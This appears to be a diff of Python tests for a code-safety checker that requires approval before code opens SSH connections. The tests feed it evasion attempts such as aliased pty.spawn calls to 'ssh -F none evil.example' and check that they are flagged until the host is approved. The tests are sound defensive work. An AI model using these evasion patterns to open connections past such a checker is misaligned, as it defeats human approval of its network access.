@@ -1069,3 +1069,17 @@ def test_blank_lines_preserve_command_boundaries():
 def test_quoted_newline_is_still_data():
     command = "printf '%s' 'hello\nssh -F none evil.example\n'"
     assert check_ssh_command_access(command, "review") is None
+
+
+@pytest.mark.parametrize(
+    "code",
+    [
+        "import pty; pty.spawn(['ssh','-F','none','evil.example'])",
+        "from pty import spawn as launch; launch(['ssh','-F','none','evil.example'])",
+        "import pty as p; launch=p.spawn; launch(argv=['ssh','-F','none','evil.example'])",
+    ],
+)
+def test_pty_ssh_requires_approval(code):
+    assert _check_code_safety(code, session_id = "review") is not None
+    approve_hosts("review", ["evil.example"])
+    assert _check_code_safety(code, session_id = "review") is None
